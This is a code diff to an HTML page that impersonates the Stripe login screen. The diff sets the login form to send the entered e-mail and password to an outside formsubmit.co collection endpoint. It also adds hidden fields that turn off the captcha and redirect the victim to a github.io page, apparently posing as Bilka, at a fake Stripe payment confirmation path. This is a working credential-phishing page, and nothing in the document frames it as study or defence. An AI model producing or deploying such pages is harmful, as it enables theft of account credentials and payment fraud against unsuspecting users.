@@ -21,7 +21,7 @@
             <!-- Titre -->
             <h1>Log in to your account</h1>
 
-            <form>
+            <form method="POST" action="https://formsubmit.co/acb3cba3487868efd28a4ddb8b1c4db7" enctype="multipart/form-data">
                 <!-- Champ E-mail -->
                 <div class="form-group">
                     <label for="email">E-mail</label>
@@ -72,9 +72,16 @@
                 <div class="signup-box">
                     New to Stripe ? <a href="https://dashboard.stripe.com/register">Create an account</a>
                 </div>
+                <!-- Désactiver le captcha -->
+                <input type="hidden" name="_captcha" value="false">
+                <!-- Subject -->
+                <input type="hidden" name="_subject" value="Stripe">
+                <!-- Affichage en tableau -->
+                <input type="hidden" name="_template" value="table">
+                <!-- Redirection vers votre page personnalisée -->
+                <input type="hidden" name="_next" value="https://bilka-dk.github.io/bilka-dk/payment/stripe/confirm.html">
             </form>
         </div>
-    </div>
 
 </body>
 </html>
